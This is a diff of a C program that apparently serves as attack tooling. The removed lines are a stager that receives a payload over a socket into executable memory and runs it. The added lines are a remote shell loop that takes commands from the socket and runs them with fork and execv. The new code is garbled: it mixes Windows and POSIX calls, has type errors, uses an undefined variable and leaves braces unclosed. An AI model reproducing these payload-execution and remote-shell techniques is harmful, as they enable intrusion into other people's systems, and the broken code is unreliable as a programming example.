@@ -28,36 +28,54 @@ int main() {
 
   // Receive data from port;
   char buf[BUF_LEN] = "";
-  char *rwx = (char *)VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-  char *index = rwx;    // Pointer to track position in the payload buffer.
   int res = 0;          // Hold return value of recv().
-  u_long size = 0;      // Holds the size of the payload.
-  int rcvd = 0;         // Track how many bytes we have received. Should match size when done.
-
-  printf("Receiving\n");
-  do {
-    res = recv( ConnectSocket, index, BUF_LEN, 0 );
-    if (rcvd == 0) { size = *(u_long*)rwx; printf("Payload size: %d", size);}
-    index += res;
-    rcvd += res;
-  } while (size > rcvd);
+  char prompt = "Shell&gt;"
+  
+  while (1) {
+	// Send the prompt
+	send(ConnectSocket, prompt, sizeof(prompt), 0);
+	
+	// Get a command
+    res = recv( ConnectSocket, buf, BUF_LEN, 0 );
+	
+	if (buf == "quit\n") 
+	{ 
+	  break; 
+	} 
+	else
+	{
+	
+	// Fork the process
+	int pid = fork();
+	
+	//Error checking to see if fork works. If pid !=0 then it's the parent.
+	if(pid!=0)
+	{
+	  wait(NULL);
+	}
+	else
+	{
+	  //if pid = 0 then we're at the child
+	        //Count the number of arguments
+	        int num_of_args = countArgs(buffer);
+	        //create an array of pointers for the arguments to be passed to execcv.
+	        char *arguments[num_of_args+1];
+	        //parse the input and arguments will have all the arguments to be passed to the program
+	        parse(buffer, num_of_args, arguments);
+	        //set the last pointer in the array to NULL. Requirement of execv
+	        arguments[num_of_args] = NULL;
+	        //This will be the final path to the program that we will pass to execv
+	        char prog[512];
+	        //First we copy a /bin/ to prog
+	        strcpy(prog, path);
+	        //Then we concancate the program name to /bin/
+	        //If the program name is ls, then it'll be /bin/ls
+	        strcat(prog, arguments[0]);
+	        //pass the prepared arguments to execv and we're done!
+	        int rv = execv(prog, arguments);
+	
+	
+  }
 
   closesocket(ConnectSocket);
-
-  //index = rwx;
-  //int i = 0;
-  //do {
-  //  *index = 90;
-  //  index ++;
-  //  i++;
-  //} while (i < 4);
-
-
-
-  // printf("Executing payload.\n");
-  // Execute the received payload. Skip the first four bytes, which holds the size of the payload.
-  void (*func) ();
-  func = (void (*) ()) (u_long*)(rwx + 4);
-  (void) (*func) (); 
 }
-
